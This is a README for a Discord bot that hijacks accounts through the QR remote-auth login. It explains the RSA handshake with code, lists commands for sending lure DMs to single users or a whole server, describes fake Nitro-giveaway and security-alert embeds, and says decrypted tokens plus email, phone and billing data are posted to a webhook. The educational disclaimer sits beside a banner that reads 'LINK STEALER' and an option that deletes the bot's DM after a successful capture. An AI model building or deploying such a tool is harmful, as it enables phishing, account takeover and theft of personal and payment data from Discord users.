# ra-websocket

A code for login to a Discord account with an RA (Remote Auth) link.

Built with Node.js, `ws`, `crypto`, `axios`, and `discord.js`. This project implements the Discord Remote Auth protocol from scratch — RSA key exchange, nonce proof, heartbeat, QR link generation, and token decryption — without relying on any third-party remote-auth library.

> ⚠️ **Disclaimer**  
> This code is for educational and security research purposes only. Use it only on accounts you own or have explicit permission to test. The author is not responsible for any misuse or damage caused by this project.

---

## Table of Contents

- [How It Works](#how-it-works)
  - [1. WebSocket Handshake](#1-websocket-handshake)
  - [2. RSA Key Exchange](#2-rsa-key-exchange)
  - [3. Nonce Proof](#3-nonce-proof)
  - [4. QR Link Generation](#4-qr-link-generation)
  - [5. User Scans the QR](#5-user-scans-the-qr)
  - [6. Token Decryption](#6-token-decryption)
- [Architecture](#architecture)
- [Commands](#commands)
- [Templates](#templates)
- [Setup](#setup)
  - [Requirements](#requirements)
  - [Installation](#installation)
  - [Configuration](#configuration)
  - [Running](#running)
- [Project Structure](#project-structure)
- [Flow Diagram](#flow-diagram)
- [Notes](#notes)
- [License](#license)

---

## How It Works

Discord Remote Auth (RA) is the protocol used by the Discord desktop client when you log in by scanning a QR code with your phone. The desktop client opens a WebSocket connection to Discord's remote-auth gateway, performs a cryptographic handshake, and then displays a QR code. When the user scans it with the mobile app and approves the login, the mobile app encrypts the account token with the desktop client's public key and sends it back. The desktop client decrypts it with its private key and logs in.

This project reimplements that flow from scratch.

### 1. WebSocket Handshake

The client connects to:

```
wss://remote-auth-gateway.discord.gg/?v=2
```

It sends an `Origin: https://discord.com` header and a browser-like `User-Agent`. Discord responds with a `hello` packet containing:

- `heartbeat_interval` — how often to send heartbeats (ms)
- `timeout_ms` — how long the session is valid

The client starts a heartbeat loop and sends an `init` packet.

### 2. RSA Key Exchange

Before sending `init`, the client generates a 2048-bit RSA key pair:

```js
const { publicKey, privateKey } = crypto.generateKeyPairSync('rsa', {
  modulusLength: 2048,
  publicKeyEncoding: { type: 'spki', format: 'der' },
  privateKeyEncoding: { type: 'pkcs8', format: 'pem' },
});
```

The public key (DER, base64) is sent in the `init` packet:

```json
{ "op": "init", "encoded_public_key": "<base64 DER SPKI>" }
```

Discord stores this public key for the session. Everything the mobile app later encrypts will use this key.

### 3. Nonce Proof

Discord sends back a `nonce_proof` packet with an `encrypted_nonce` — a random nonce encrypted with the client's public key (RSA-OAEP with SHA-256).

The client decrypts it with its private key, hashes it with SHA-256, base64url-encodes the digest, and sends it back:

```json
{ "op": "nonce_proof", "proof": "<base64url sha256 of decrypted nonce>" }
```

This proves the client actually owns the private key corresponding to the public key it sent.

### 4. QR Link Generation

After a successful nonce proof, Discord sends `pending_remote_init` with a `fingerprint`:

```json
{ "op": "pending_remote_init", "fingerprint": "..." }
```

The QR link is simply:

```
https://discord.com/ra/<fingerprint>
```

This link can be rendered as a QR code. When scanned by the Discord mobile app, the app connects to Discord's servers and associates the scan with this session.

### 5. User Scans the QR

When the user scans and approves the login on their phone, Discord sends `pending_ticket` to the desktop client, then `pending_finish`. The `pending_finish` packet contains an `encrypted_token` — the user's account token, encrypted with the client's public key using RSA-OAEP SHA-256.

### 6. Token Decryption

The client decrypts `encrypted_token` with its private key:

```js
const token = crypto.privateDecrypt(
  { key: privateKey, padding: crypto.constants.RSA_PKCS1_OAEP_PADDING, oaepHash: 'sha256' },
  Buffer.from(data.encrypted_token, 'base64')
).toString('utf8');
```

That's the account token. From here, the client can call the Discord API with `Authorization: <token>` to fetch user info (username, email, phone, Nitro status, billing methods) and send it wherever it wants (in this project, a Discord webhook).

---

## Architecture

```
┌─────────────┐     WebSocket      ┌──────────────────────┐
│   Client    │◄──────────────────►│ remote-auth-gateway  │
│  (this bot) │                    │   (discord.gg)       │
└──────┬──────┘                    └──────────┬───────────┘
       │                                      │
       │ 1. hello                             │
       │ 2. init (public key)                 │
       │ 3. nonce_proof                       │
       │ 4. pending_remote_init (fingerprint) │
       │                                      │
       │         ┌──────────────────┐         │
       │         │  Discord mobile  │         │
       │         │   app (scanner)  │         │
       │         └────────┬─────────┘         │
       │                  │                   │
       │                  │ scan + approve    │
       │                  ▼                   │
       │ 5. pending_ticket ◄──────────────────┘
       │ 6. pending_finish (encrypted_token)
       │
       ▼
  decrypt token with private key
       │
       ▼
  GET /users/@me (Authorization: token)
       │
       ▼
  POST webhook (exfiltrate)
```

---

## Commands

| Command | Description |
|---|---|
| `!attack <user_id> [template]` | Generate an RA link and DM the target with the chosen embed template |
| `!massattack [template] [delay]` | Send RA links to every member in the current guild |
| `!generate [template]` | Generate a raw RA link and post it in the current channel |
| `!sessions` | Show active RA sessions (victim, expiry, heartbeat status) |
| `!verify` | Send a verification embed with a **Verify** link and a **Fast-Verify** button |
| `!qr` | Use Puppeteer to open `discord.com/login`, extract the QR SVG, decode it with `jsqr`, and return the RA link |
| `!help` | Show the full command list |

The **Fast-Verify** button triggers the same RA flow but replies ephemerally to the user who clicked it.

---

## Templates

The `[template]` argument controls which embed is sent:

| Name | Description |
|---|---|
| `security` (default) | "Discord Security Verification" embed |
| `giveaway` / `nitro` | "You Won Discord Nitro!" embed |
| `mod` / `warning` | "Account Security Alert" embed |
| `boost` / `booster` | "Server Boost Reward" embed |
| `partner` / `partnership` | "Discord Partner Invitation" embed |

Each template is a separate function (`createPhishingEmbed`, `createGiveawayEmbed`, etc.) that returns a `{ embeds, components }` payload. `pickTemplate(template, link)` dispatches to the right one.

---

## Setup

### Requirements

- Node.js 18+ (uses `crypto.generateKeyPairSync`, `ws`, `discord.js` v14)
- A Discord bot token (for the bot commands)
- A Discord webhook URL (to receive captured data)
- Optional: Chrome / Edge / Chromium for the `!qr` command (Puppeteer)

### Installation

```bash
git clone https://github.com/Philorganon/ra-websocket.git
cd ra-websocket
npm install discord.js axios ws puppeteer jsqr
```

### Configuration

Edit the `CONFIG` object at the top of `index.js`:

```js
const CONFIG = {
  BOT_TOKEN: 'YOUR_BOT_TOKEN',
  WEBHOOK_URL: 'YOUR_WEBHOOK_URL',
  PREFIX: '!',
  RA_EXPIRE_TIME: 600000, // 10 minutes
  EMBED_COLOR: '#5865F2',
  FOOTER_TEXT: 'Discord Security',
  DELETE_AFTER_SUCCESS: true,
  AUTO_LEAVE_SERVER: false,
  USE_MOBILE_OPTIMIZATION: true,
};
```

If you want to use the `!verify` command with a banner image, place a `verify-banner.png` in the project root. If it's missing, the embed is sent without an image.

### Running

```bash
node index.js
```

You should see:

```
╔══════════════════════════════════════════╗
║   DISCORD RA LINK STEALER - READY        ║
╚══════════════════════════════════════════╝
[BOT] Logged in as <bot>#0000
[CONFIG] Webhook: ✓
[INFO] Type !help for command list
```

Then type `!help` in any channel the bot can read.

---

## Project Structure

```
ra-websocket/
├── index.js                # main bot + RA client
├── verify-banner.png       # optional banner for !verify
├── package.json
└── README.md
```

The most important function is `startRASession(object, isInteraction, victimId, template)`. It:

1. Generates an RSA key pair for this session
2. Opens a WebSocket to the remote-auth gateway
3. Handles `hello`, `nonce_proof`, `pending_remote_init`, `pending_ticket`, `pending_finish`, `cancel`
4. Sends the RA link to the target (DM, interaction reply, or channel message)
5. Decrypts the token on `pending_finish`
6. Fetches user info and billing data
7. POSTs the embed to the configured webhook

`!qr` is separate: it uses Puppeteer to scrape the QR from `discord.com/login`, decodes it with `jsqr`, and returns the RA link — but does **not** decrypt any token, because Puppeteer doesn't participate in the RSA handshake. It's a "read-only" way to get a fresh RA link without spawning a WebSocket.

---

## Flow Diagram

```
┌─────────┐        ┌─────────┐        ┌─────────────────────┐        ┌──────────────┐
│  User   │        │   Bot   │        │ remote-auth-gateway │        │  Mobile App  │
└────┬────┘        └────┬────┘        └──────────┬──────────┘        └──────┬───────┘
     │                  │                        │                         │
     │  !attack <id>    │                        │                         │
     ├─────────────────►│                        │                         │
     │                  │                        │                         │
     │                  │  1. WebSocket connect  │                         │
     │                  ├───────────────────────►│                         │
     │                  │                        │                         │
     │                  │  2. hello              │                         │
     │                  │◄───────────────────────┤                         │
     │                  │                        │                         │
     │                  │  3. init (public key)  │                         │
     │                  ├───────────────────────►│                         │
     │                  │                        │                         │
     │                  │  4. nonce_proof        │                         │
     │                  │◄───────────────────────┤                         │
     │                  │                        │                         │
     │                  │  5. nonce_proof (proof)│                         │
     │                  ├───────────────────────►│                         │
     │                  │                        │                         │
     │                  │  6. pending_remote_init│                         │
     │                  │◄───────────────────────┤                         │
     │                  │     (fingerprint)      │                         │
     │                  │                        │                         │
     │                  │  7. DM with RA link    │                         │
     │                  ├───────────────────────►│ (to target)             │
     │                  │                        │                         │
     │  Receives DM     │                        │                         │
     │◄─────────────────┤                        │                         │
     │                  │                        │                         │
     │  Opens RA link   │                        │                         │
     ├──────────────────────────────────────────────────────────────────────►│
     │                  │                        │                         │
     │                  │                        │  8. scan + approve      │
     │                  │                        │◄────────────────────────┤
     │                  │                        │                         │
     │                  │  9. pending_ticket     │                         │
     │                  │◄───────────────────────┤                         │
     │                  │                        │                         │
     │                  │ 10. pending_finish     │                         │
     │                  │◄───────────────────────┤                         │
     │                  │     (encrypted_token)  │                         │
     │                  │                        │                         │
     │                  │ 11. decrypt token      │                         │
     │                  │     (private key)      │                         │
     │                  │                        │                         │
     │                  │ 12. GET /users/@me     │                         │
     │                  ├───────────────────────►│                         │
     │                  │◄───────────────────────┤                         │
     │                  │     (user info)        │                         │
     │                  │                        │                         │
     │                  │ 13. POST webhook       │                         │
     │                  ├───────────────────────►│                         │
     │                  │                        │                         │
     │                  │ 14. close WebSocket    │                         │
     │                  ├───────────────────────►│                         │
     │                  │                        │                         │
```

---

## Notes

- The RSA key pair is **per-session**. Every `startRASession` call generates a fresh key pair, because Discord binds the public key to the session's `fingerprint`.
- The RA link expires after ~2 minutes on Discord's side. The `RA_EXPIRE_TIME` config controls how long the client keeps the WebSocket open; after that it closes and marks the session expired.
- Heartbeats must be sent at the interval given in `hello`, otherwise Discord disconnects the client.
- `pending_finish` is the only packet that carries the token. If the user cancels on their phone, you get `cancel` instead.
- `!massattack` respects the `delay` argument between DMs to avoid rate limits. The default is 2000 ms.
- `DELETE_AFTER_SUCCESS` removes the bot's own DM after a successful capture, if the message object was stored.

---

## License

MIT
```
